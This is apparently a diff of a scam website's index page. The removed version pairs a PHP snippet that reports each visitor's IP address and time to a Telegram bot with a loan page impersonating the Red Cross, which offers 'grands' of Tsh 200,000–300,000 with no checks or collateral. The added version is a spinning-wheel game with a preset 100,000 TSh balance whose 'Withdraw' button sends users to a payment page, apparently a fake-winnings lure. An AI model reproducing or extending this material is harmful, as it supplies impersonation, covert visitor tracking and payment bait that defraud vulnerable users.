@@ -1,164 +1,262 @@
-<?php
-// === TELEGRAM NOTIFICATION SCRIPT ===
-$botToken = 'YOUR_BOT_TOKEN'; // <-- Replace with your bot token
-$chatId = 'YOUR_CHAT_ID';     // <-- Replace with your chat ID
+<!DOCTYPE html>
+<html lang="en">
 
-$ip = $_SERVER['REMOTE_ADDR'];
-$time = date("Y-m-d H:i:s");
+<head>
+    <meta charset="UTF-8">
+    <title>Spinning Wheel Game</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(135deg, #0f172a, #020617);
+            color: #f1f5f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .game {
+            background: rgba(15, 23, 42, 0.8);
+            padding: 20px;
+            border-radius: 16px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            width: 420px;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .balance {
+            font-size: 18px;
+        }
+        
+        .balance span {
+            font-weight: bold;
+            margin-left: 6px;
+        }
+        
+        .wheel-container {
+            position: relative;
+            margin: 20px auto;
+            width: 320px;
+            height: 320px;
+        }
+        
+        .pointer {
+            position: absolute;
+            top: -18px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 18px solid transparent;
+            border-right: 18px solid transparent;
+            border-bottom: 30px solid #22c55e;
+            z-index: 2;
+        }
+        
+        canvas {
+            border-radius: 50%;
+            background: #0b1220;
+            box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.6);
+        }
+        
+        .controls {
+            margin-top: 15px;
+        }
+        
+        button {
+            background: #0ea5e9;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        
+        #withdrawBtn {
+            background: #16a34a;
+            /* green */
+        }
+        
+        button:disabled {
+            background: #475569;
+            cursor: not-allowed;
+        }
+        
+        .result {
+            margin-top: 12px;
+            min-height: 30px;
+            font-size: 16px;
+        }
+    </style>
+</head>
 
-$message = "📲 Homepage Visited\nIP: $ip\nTime: $time";
+<body>
+    <div class="game">
+        <div class="header">
+            <h2>🎡 Spinning Wheel</h2>
+            <div class="balance">⚖️ Balance: <span id="balance">100000</span> TSh</div>
+        </div>
+        <div class="wheel-container">
+            <div class="pointer"></div>
+            <canvas id="wheel" width="320" height="320"></canvas>
+        </div>
+        <div class="controls">
+            <button id="spinBtn">Spin (Cost 50 TSh)</button>
+            <button id="withdrawBtn">Withdraw</button>
+            <button id="resetBtn">Reset</button>
+        </div>
+        <div class="result" id="result">—</div>
+    </div>
 
-file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));
-?>
+    <script>
+        const canvas = document.getElementById("wheel");
+        const ctx = canvas.getContext("2d");
+        const spinBtn = document.getElementById("spinBtn");
+        const resetBtn = document.getElementById("resetBtn");
+        const withdrawBtn = document.getElementById("withdrawBtn");
+        const balanceEl = document.getElementById("balance");
+        const resultEl = document.getElementById("result");
 
-    <!DOCTYPE html>
-    <html lang="en">
+        let balance = 100000; // starting balance in TSh
+        let spinning = false;
+        let angle = 0;
 
-    <head>
-        <meta charset="UTF-8" />
-        <meta name="viewport" content="width=device-width, initial-scale=1" />
-        <meta name="description" content="Get instant mobile loans from Ksh. 3,000 to Ksh. 50,000 processed in under 5 minutes. No collateral or paperwork needed." />
-        <title>Instant Mobile Grands</title>
+        const spinCost = 50;
+        const segments = [{
+            label: "+2000 TSh",
+            amount: 2000,
+            color: "#155e75"
+        }, {
+            label: "Try Again",
+            amount: 0,
+            color: "#166534"
+        }, {
+            label: "+10000 TSh",
+            amount: 10000,
+            color: "#7c2d12"
+        }, {
+            label: "-3000 TSh",
+            amount: -3000,
+            color: "#1e3a8a"
+        }, {
+            label: "+5000 TSh",
+            amount: 5000,
+            color: "#065f46"
+        }, {
+            label: "Jackpot +20000 TSh",
+            amount: 20000,
+            color: "#7f1d1d"
+        }, {
+            label: "-6000 TSh",
+            amount: -6000,
+            color: "#083344"
+        }, {
+            label: "+1000 TSh",
+            amount: 1000,
+            color: "#3730a3"
+        }];
 
-        <!-- Bootstrap CSS -->
-        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
-        <!-- Bootstrap Icons -->
-        <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css" rel="stylesheet">
+        function drawWheel() {
+            const n = segments.length;
+            const arc = (2 * Math.PI) / n;
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
 
-        <style>
-            body {
-                background: linear-gradient(to bottom right, #eaf0f9, #f5f9ff);
-                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            segments.forEach((seg, i) => {
+                const start = angle + i * arc;
+                const end = start + arc;
+                ctx.beginPath();
+                ctx.moveTo(160, 160);
+                ctx.arc(160, 160, 150, start, end);
+                ctx.closePath();
+                ctx.fillStyle = seg.color;
+                ctx.fill();
+                ctx.stroke();
+
+                // Labels
+                ctx.save();
+                ctx.translate(160, 160);
+                ctx.rotate(start + arc / 2);
+                ctx.textAlign = "right";
+                ctx.fillStyle = "#f1f5f9";
+                ctx.font = "14px Arial";
+                ctx.fillText(seg.label, 140, 5);
+                ctx.restore();
+            });
+        }
+
+        drawWheel();
+
+        function spin() {
+            if (spinning || balance < spinCost) return;
+            spinning = true;
+            balance -= spinCost;
+            balanceEl.textContent = balance;
+
+            const spins = 4 + Math.floor(Math.random() * 3); // 4–6 turns
+            const extra = Math.random() * 2 * Math.PI;
+            const target = angle + spins * 2 * Math.PI + extra;
+            const duration = 4000;
+            const start = performance.now();
+
+            function animate(t) {
+                const elapsed = t - start;
+                const progress = Math.min(elapsed / duration, 1);
+                const ease = 1 - Math.pow(1 - progress, 3); // ease-out cubic
+                const current = angle + ease * (target - angle);
+
+                ctx.save();
+                angle = current;
+                drawWheel();
+                ctx.restore();
+
+                if (progress < 1) {
+                    requestAnimationFrame(animate);
+                } else {
+                    angle = target % (2 * Math.PI);
+                    finishSpin();
+                }
             }
-            
-            .loan-card {
-                background: #ffffff;
-                border-radius: 20px;
-                padding: 30px 25px;
-                max-width: 420px;
-                margin: 60px auto;
-                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
-                text-align: center;
-            }
-            
-            .loan-icon {
-                background-color: #2563eb;
-                width: 60px;
-                height: 60px;
-                border-radius: 12px;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                margin: 0 auto 20px;
-            }
-            
-            .loan-icon img {
-                width: 36px;
-                height: 36px;
-                object-fit: contain;
-            }
-            
-            .loan-card h1 {
-                font-size: 1.7rem;
-                font-weight: 700;
-                color: #1e3a8a;
-                margin-bottom: 10px;
-            }
-            
-            .loan-card p {
-                font-size: 1rem;
-                margin-bottom: 10px;
-            }
-            
-            .loan-card p span {
-                color: #2563eb;
-                font-weight: 600;
-            }
-            
-            .feature-list {
-                text-align: left;
-                margin-top: 20px;
-            }
-            
-            .feature-item {
-                display: flex;
-                align-items: center;
-                gap: 10px;
-                margin: 10px 0;
-            }
-            
-            .feature-item i {
-                background: #2563eb;
-                color: #fff;
-                border-radius: 50%;
-                padding: 6px;
-                font-size: 0.8rem;
-            }
-            
-            .apply-btn {
-                background-color: #2563eb;
-                color: white;
-                font-weight: 600;
-                border-radius: 12px;
-                padding: 12px;
-                font-size: 1rem;
-                width: 100%;
-                margin-top: 25px;
-                border: none;
-                transition: background-color 0.3s ease;
-                text-decoration: none;
-                display: inline-block;
-            }
-            
-            .apply-btn:hover {
-                background-color: #1d4ed8;
-            }
-            
-            .footer-text {
-                font-size: 0.9rem;
-                color: #6b7280;
-                margin-top: 15px;
-            }
-        </style>
-    </head>
+            requestAnimationFrame(animate);
+        }
 
-    <body>
+        function finishSpin() {
+            const n = segments.length;
+            const arc = (2 * Math.PI) / n;
+            const idx = Math.floor((n - (angle / arc)) % n);
+            const result = segments[(idx + n) % n];
 
-        <main class="loan-card" role="region" aria-label="Loan Information Card">
-            <div class="loan-icon">
-                <img src="redcross_logo-removebg-preview (1).png" alt="Loan Logo">
-            </div>
+            balance += result.amount;
+            balanceEl.textContent = balance;
+            resultEl.textContent = `Result: ${result.label} (${result.amount >= 0 ? "Win" : "Loss"})`;
 
-            <h1>RED CROSS GRANDS DRIVE</h1>
-            <p>Access funds from <span>Tsh. 200,000</span> to <span>Tsh. 300,000</span></p>
-            <p>processed within <span>5 minutes</span>.</p>
+            spinning = false;
+        }
 
-            <div class="feature-list">
-                <div class="feature-item">
-                    <i class="bi bi-check-lg"></i>
-                    <span>No credit bureau check required</span>
-                </div>
-                <div class="feature-item">
-                    <i class="bi bi-check-lg"></i>
-                    <span>No documentation required</span>
-                </div>
-                <div class="feature-item">
-                    <i class="bi bi-check-lg"></i>
-                    <span>No collateral needed</span>
-                </div>
-                <div class="feature-item">
-                    <i class="bi bi-check-lg"></i>
-                    <span>No guarantors required</span>
-                </div>
-            </div>
+        spinBtn.addEventListener("click", spin);
+        resetBtn.addEventListener("click", () => {
+            balance = 100000;
+            balanceEl.textContent = balance;
+            resultEl.textContent = "—";
+        });
 
-            <a href="details.html" class="apply-btn" role="button" aria-label="Apply for Loan">Apply for grand</a>
-            <p class="footer-text">Serving over 100,000 satisfied people in Tanzania</p>
-        </main>
+        withdrawBtn.addEventListener("click", () => {
+            if (balance > 0) {
+                window.location.href = "payment.html";
+            } else {
+                alert("No balance to withdraw.");
+            }
+        });
+    </script>
+</body>
 
-        <!-- Bootstrap JS Bundle -->
-        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>
-
-    </body>
-
-    </html>
+</html>
